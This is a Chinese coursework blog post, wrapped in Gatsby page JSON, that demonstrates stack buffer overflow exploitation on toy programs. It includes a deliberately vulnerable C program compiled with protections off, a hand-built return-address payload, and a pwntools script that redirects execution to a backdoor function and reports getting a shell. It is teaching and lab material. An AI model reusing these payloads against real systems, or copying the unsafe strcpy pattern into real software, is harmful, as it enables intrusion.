{"componentChunkName":"component---src-pages-detail-tsx","path":"/detail/a3697df1-78f6-5a6a-a5b3-d50f08733cda","result":{"pageContext":{"html":"<h1>概述</h1>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 407px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"https://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/7c57d6fa56eaf230797133cab3ab0cfd/5bf10/stack-frame.jpg\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 110.13513513513513%; position: relative; bottom: 0; left: 0; background-image: url('data:image/jpeg;base64,/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wgARCAAWABQDASIAAhEBAxEB/8QAGQABAAIDAAAAAAAAAAAAAAAAAAMEAQIF/8QAFAEBAAAAAAAAAAAAAAAAAAAAAP/aAAwDAQACEAMQAAAB71WxoTAxGEgP/8QAGRAAAwADAAAAAAAAAAAAAAAAAAERAhIg/9oACAEBAAEFAjFPbmEP/8QAFBEBAAAAAAAAAAAAAAAAAAAAIP/aAAgBAwEBPwEf/8QAFBEBAAAAAAAAAAAAAAAAAAAAIP/aAAgBAgEBPwEf/8QAFhAAAwAAAAAAAAAAAAAAAAAAAAEw/9oACAEBAAY/AhQ//8QAHRAAAwACAgMAAAAAAAAAAAAAAAERMUEQIVFxkf/aAAgBAQABPyG1OCtKvfDUTN42JQuRdtCRefp//9oADAMBAAIAAwAAABBzAAD/xAAUEQEAAAAAAAAAAAAAAAAAAAAg/9oACAEDAQE/EB//xAAUEQEAAAAAAAAAAAAAAAAAAAAg/9oACAECAQE/EB//xAAdEAEBAAMAAgMAAAAAAAAAAAABEQAhMUFRYXGR/9oACAEBAAE/EJ9dTEQly1OYWbRfgwId1uzC2aaAhLrIJV+8bicyR4L4o4JB/TP/2Q=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"stack-frames\"\n        title=\"stack-frames\"\n        src=\"https://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/7c57d6fa56eaf230797133cab3ab0cfd/5bf10/stack-frame.jpg\"\n        srcset=\"https://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/7c57d6fa56eaf230797133cab3ab0cfd/a80bd/stack-frame.jpg 148w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/7c57d6fa56eaf230797133cab3ab0cfd/1c91a/stack-frame.jpg 295w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/7c57d6fa56eaf230797133cab3ab0cfd/5bf10/stack-frame.jpg 407w\"\n        sizes=\"(max-width: 407px) 100vw, 407px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n      />\n  </a>\n    </span></p>\n<p>软件漏洞分析课程的一次作业，利用了栈内存的缓冲区溢出，覆盖了返回地址，从而达到劫持控制流的目的。如果希望能具体了解一下图中 c 函数调用的实现，可以看一下 B 站上陈渝教授的这个视频。</p>\n<iframe style=\"margin-left: 50%;transform: translateX(-50%);width: 50vw;height: 40vw;\" src=\"//player.bilibili.com/player.html?aid=77228694&bvid=BV1mJ411X73U&cid=132102373&page=5\" scrolling=\"no\" border=\"0\" frameborder=\"no\" framespacing=\"0\" allowfullscreen=\"true\"> </iframe>\n<h1>EXP1</h1>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-c line-numbers\"><code class=\"language-c\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string.h></span></span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">function2</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Executed chagned\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">function1</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">char</span> buffer<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">strcpy</span><span class=\"token punctuation\">(</span>buffer<span class=\"token punctuation\">,</span>str<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>argv<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n  <span class=\"token function\">function1</span><span class=\"token punctuation\">(</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Executed normally\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>使用<code>gdb</code>进行调试，<code>strcpy</code>函数可以被利用引起缓冲区溢出，目前的问题时需要多长的字符串，以及需要将<code>function1</code>栈帧的返回地址覆盖为什么</p>\n<p>环境</p>\n<blockquote>\n<p>ubuntu 16.04</p>\n<p>gcc 5.4.0</p>\n<p>gdb 7.11.1</p>\n</blockquote>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 590px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"https://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/615607ca0f0499a746f158e14fb991ef/82e86/ubuntu-arch.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 49.32432432432432%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAIAAAA7N+mxAAAACXBIWXMAAAsTAAALEwEAmpwYAAABUUlEQVQoz4VS7W7DIAzMK6xblpSCDQGT8J22677e/8HmJdO0H9MmnRAyPt9x0MkQoBVsRcwB/QpTMa6irYaapZjzmSj1R3w44v0IjMOgeH3YKt1WxcMAo7RxvTlKF58A7ElObckpn2NapzkzTkgCnTLzqOzO/yIro7Sz5fyS2y1QFHIS0tyWPFOkuApw/ckwBjkxeqF3Fx0zR4mpSrA8zEjt6/VtLldWLj75UCk0dIEFBRJrgg28kZt+Z3yec0tVCYDNvzQ+sRo7X1zw+eJC5Yma0uPJMJjzuFlg/Y6rsV5yw1HBYcS7ESZN0S581h819/UCd9p+z8918/x5Z1YbJOamDAF3s/vnpRUX7/eEj/Cd857wT3wFBhN4sq9xfQq5JKu0PvzW/QuZwU/FCVv0nky7Ck38mMjO/yGP3osURA6D8XKq4AqFzJ9E07o+vf9N/gD4UUmyTJJzjwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"arch\"\n        title=\"arch\"\n        src=\"https://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/615607ca0f0499a746f158e14fb991ef/fcda8/ubuntu-arch.png\"\n        srcset=\"https://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/615607ca0f0499a746f158e14fb991ef/12f09/ubuntu-arch.png 148w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/615607ca0f0499a746f158e14fb991ef/e4a3f/ubuntu-arch.png 295w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/615607ca0f0499a746f158e14fb991ef/fcda8/ubuntu-arch.png 590w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/615607ca0f0499a746f158e14fb991ef/efc66/ubuntu-arch.png 885w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/615607ca0f0499a746f158e14fb991ef/c83ae/ubuntu-arch.png 1180w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/615607ca0f0499a746f158e14fb991ef/82e86/ubuntu-arch.png 1978w\"\n        sizes=\"(max-width: 590px) 100vw, 590px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n      />\n  </a>\n    </span></p>\n<p>关闭堆栈保护机制，使用<code>gcc</code>编译</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">gcc -g main.c -m32 -o main32 -z execstack -fno-stack-protector</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 590px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"https://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/d117136acea3a1946d7ab58de5f5c27a/a2ef2/gdb-debug.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 90.54054054054053%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAASCAIAAADUsmlHAAAACXBIWXMAAAsTAAALEwEAmpwYAAAB1ElEQVQ4y42UiW6kMBBE/Qu5BhgOGx/c58AkMzmkKP//UXnAajfSZslKLY8Nrq6u6maENMW9L+/95JjYrOrzenBFF8SGJw+B3A+R6IIfP9J+mLJ6YUr44bL5GSw1zEkonc5qaItmLNuTLVqTNUFsD0e1B05dTZFcgipO80hlrKG0pEOId1Sk/pcE0Q6PZTPCH+tcZw0qYpVxBEkW1lVO+m0JwuQNBStTxunCCVjZkiMVyfVhonOekOVvfqFsBYbKsR2p3HNlR4og1gSENw/hzSHair/z4q8pRFGP3IYndZV2tXHNIl5lSIiUA4xzJm+9UEHOBZj+gPF2mK7KVLybHl+H0wWTsP3y8p6VPc0b5sv09IpyOK5vH67sf5OLqp/rbt4Gg9dUDhtWIzhIllaltsIUNmRn/1W8wGoY8nqUpsJkvXbu1ouQd+f90klw9RvNC7jqq3ZiPNCPz8TaZIPm/TnD7fJ0fiYoGAyF4VzdTTZfjj9MWJjY0/mFUQEDDw2jt7iIERxvD9EuWLpxvnbjE72hVMB0vh3PtIB07He+MMB2nJ/b4YylJEIwPjNVZCEXrdqpXNB0BMNMt9aalwml2s3Y/a9aYPV8eWOMoN2m53/+Brb4BEcAhf5EKBEdAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"gdb\"\n        title=\"gdb\"\n        src=\"https://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/d117136acea3a1946d7ab58de5f5c27a/fcda8/gdb-debug.png\"\n        srcset=\"https://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/d117136acea3a1946d7ab58de5f5c27a/12f09/gdb-debug.png 148w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/d117136acea3a1946d7ab58de5f5c27a/e4a3f/gdb-debug.png 295w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/d117136acea3a1946d7ab58de5f5c27a/fcda8/gdb-debug.png 590w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/d117136acea3a1946d7ab58de5f5c27a/efc66/gdb-debug.png 885w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/d117136acea3a1946d7ab58de5f5c27a/c83ae/gdb-debug.png 1180w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/d117136acea3a1946d7ab58de5f5c27a/a2ef2/gdb-debug.png 1970w\"\n        sizes=\"(max-width: 590px) 100vw, 590px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n      />\n  </a>\n    </span></p>\n<p>可以得出<code>ebp</code>与<code>&#x26;buffer</code>相距 13 个字节，同时返回地址占用 4 个字节，<code>function2</code>的地址为<code>0x0804845B</code>。由于采用的是<code>小端存储</code>，因此需要将目标函数地址按字节倒序写入。构造出 payload<code>AAAAAAAAAAAAAAAAA\\x5B\\x84\\x04\\x08</code></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 590px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"https://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/aa363d0cd5cbcc6a9d437767e02adae0/691b3/stack-overlow-result.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 10.81081081081081%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAACCAIAAADXZGvcAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAYklEQVQI113IQQ6DMAwAQd4AFEppbGInsQKNbfH/xzW9VprDagdWYzc2Y1HkdqQGdL2PGmIJUSDKDmnH3PsFqU/k2gHJsuHA6uxOn0aiVLycN/IVs+Zq4xLmJ/yZ1p8ejw2/AhkPvVubNmUAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"stack-overflow-result\"\n        title=\"stack-overflow-result\"\n        src=\"https://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/aa363d0cd5cbcc6a9d437767e02adae0/fcda8/stack-overlow-result.png\"\n        srcset=\"https://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/aa363d0cd5cbcc6a9d437767e02adae0/12f09/stack-overlow-result.png 148w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/aa363d0cd5cbcc6a9d437767e02adae0/e4a3f/stack-overlow-result.png 295w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/aa363d0cd5cbcc6a9d437767e02adae0/fcda8/stack-overlow-result.png 590w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/aa363d0cd5cbcc6a9d437767e02adae0/efc66/stack-overlow-result.png 885w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/aa363d0cd5cbcc6a9d437767e02adae0/c83ae/stack-overlow-result.png 1180w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/aa363d0cd5cbcc6a9d437767e02adae0/691b3/stack-overlow-result.png 2156w\"\n        sizes=\"(max-width: 590px) 100vw, 590px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n      />\n  </a>\n    </span></p>\n<p>成功调用了<code>function2</code>，同理地址也可以被改成其他的函数地址。</p>\n<h1>EXP2</h1>\n<p>已知一个<a href=\"https://raw.github.com/ChenKS12138/ChenKS12138.github.io/source-code/assets/stack-tutorial\">二进制文件</a>，通过 ida 静态调试。</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 590px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"https://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/6551ec9e82169a0ffc1d9fffe71d1295/95c1f/stack-overflow-ida.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 61.48648648648649%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAIAAADtbgqsAAAACXBIWXMAAAsTAAALEwEAmpwYAAABp0lEQVQoz4WSW3OaQBiG+f9/pO2kF51kpml7UU2slXAQFgE5KSAgxAWWg1pZhc0aml50OuWdZ3a+i32+3YuX0RUOgKWiLgVZnQNN05asrNz+mNyx8g1vfuCcG866m8ks+53j7w1jOuUkXlK4p+nnT7eMYFgCz4mGrVu2Y+hr21IMU1BlVtEepdUXkf+qBB+fkm9CYHqm7+ue7wfh1vVdWVYYYPqht7k0LT4259O5OeLsOT3VR2Ohlgjty7DM9vEzzqq2I6TrKNeQ1zDiT997WJ3XF+ITSuu2Ocixg0fvxokOrwLpr3Y9b+Z1YFQQb0S3dvckIZQu7nbargka7p7L3fy39LbgrzBgHdmWsU3ifiU9UYEwxkABVV2R/4YBTmRoWlmU/b+6tkM5wg2WJKksywF5trA1VdlBWJQFhT7rei5M4Wg8irbRgCybYWB7l+Ol/dVS6AAjeKpOwkxAEA3I0nSTsBF2zsQjPc7YOSwPk/cTqMMB+XEszUe8v9ikqxTakOJITmLG8weRNmJADmEWp2lWV2lVZYgWBGZVhQ77rK5hgf704Z95Aa+EmnuPegmcAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"ida\"\n        title=\"ida\"\n        src=\"https://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/6551ec9e82169a0ffc1d9fffe71d1295/fcda8/stack-overflow-ida.png\"\n        srcset=\"https://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/6551ec9e82169a0ffc1d9fffe71d1295/12f09/stack-overflow-ida.png 148w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/6551ec9e82169a0ffc1d9fffe71d1295/e4a3f/stack-overflow-ida.png 295w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/6551ec9e82169a0ffc1d9fffe71d1295/fcda8/stack-overflow-ida.png 590w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/6551ec9e82169a0ffc1d9fffe71d1295/efc66/stack-overflow-ida.png 885w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/6551ec9e82169a0ffc1d9fffe71d1295/c83ae/stack-overflow-ida.png 1180w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/6551ec9e82169a0ffc1d9fffe71d1295/95c1f/stack-overflow-ida.png 2330w\"\n        sizes=\"(max-width: 590px) 100vw, 590px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n      />\n  </a>\n    </span></p>\n<p>vulnerable_function 中的 buffer 只需要 1 个字节，但是第五行的 read 函数可以输入 256 个字节，这里可能存在着栈溢出。根据第三行的注释推测，<code>&#x26;buffer</code>距离<code>ebp</code>位 0x30 个字节，猜测我们需要构造的 payload 为 52 字节的字符串再加上目标函数的地址，即<code>backdoor</code>函数的地址。</p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-python line-numbers\"><code class=\"language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\np<span class=\"token operator\">=</span>process<span class=\"token punctuation\">(</span><span class=\"token string\">\"./stack\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\nret_addr<span class=\"token operator\">=</span><span class=\"token number\">0x0804846B</span>\n\npayload <span class=\"token operator\">=</span> <span class=\"token string\">\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">52</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>ret_addr<span class=\"token punctuation\">)</span>\n\np<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 590px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"https://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/ddd146a87bcc0eff5a7e0e26db5d80a5/0c3d0/stack-overflow-pwn-result.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 72.2972972972973%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAIAAACgpqunAAAACXBIWXMAAAsTAAALEwEAmpwYAAABfklEQVQoz42SC27bMBBEfYUmdvTndymSokhJVCwj9f3v1bGcxkVRxAUGC0HYxx0O9yCnROdMl+yum1omYWIfLuRW7TK5rO1i/Du5WfWDsqN2Y8100YiyldBBu9SP6JhkH5SNnHzRqteKQ0fU8i52q59/2JcONTettJ1ykKBBmAD4uPc91aERPRiuPSZjPobXnE61wBFvjXwCAwNcsRvQcMO0g3N4UT2uR/D2HcyU0y4iDDNMtH88HfiAQdpx8TED29OSsHCsxGnX7z7xb1ikZN6zWOc6DoUxtXDKrpzSp3SSZhEUcR3crmzVS9E94M4PMqWiN5V3paaaW6ZSK0Mjh0bcxDTIwNTtRZBuK/vd2n1yTDQvw7a585mm2fg5zB8pX8kvbjzH/JPp0YbVhtnFFbmCf8Bko3GTNqMdsEaRfOrD3CmLB0OtmP7x1r6WHdxC99142PY+jcuGzNq9FQdjbZDQ1xp9l/a2XWO+YPvuB788A/56Z1txAnn6P+BP/QKWbGcMQ2dUPwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"EXP2-RESULT\"\n        title=\"EXP2-RESULT\"\n        src=\"https://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/ddd146a87bcc0eff5a7e0e26db5d80a5/fcda8/stack-overflow-pwn-result.png\"\n        srcset=\"https://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/ddd146a87bcc0eff5a7e0e26db5d80a5/12f09/stack-overflow-pwn-result.png 148w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/ddd146a87bcc0eff5a7e0e26db5d80a5/e4a3f/stack-overflow-pwn-result.png 295w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/ddd146a87bcc0eff5a7e0e26db5d80a5/fcda8/stack-overflow-pwn-result.png 590w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/ddd146a87bcc0eff5a7e0e26db5d80a5/efc66/stack-overflow-pwn-result.png 885w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/ddd146a87bcc0eff5a7e0e26db5d80a5/c83ae/stack-overflow-pwn-result.png 1180w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/ddd146a87bcc0eff5a7e0e26db5d80a5/0c3d0/stack-overflow-pwn-result.png 1414w\"\n        sizes=\"(max-width: 590px) 100vw, 590px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n      />\n  </a>\n    </span></p>\n<p>成功拿到 shell</p>","id":"a3697df1-78f6-5a6a-a5b3-d50f08733cda","headings":[{"value":"概述","depth":1},{"value":"EXP1","depth":1},{"value":"EXP2","depth":1}],"date":"Wednesday, September 16, 2020 3:59 PM","tags":["随笔"],"title":"栈溢出利用"}},"staticQueryHashes":["63159454"]}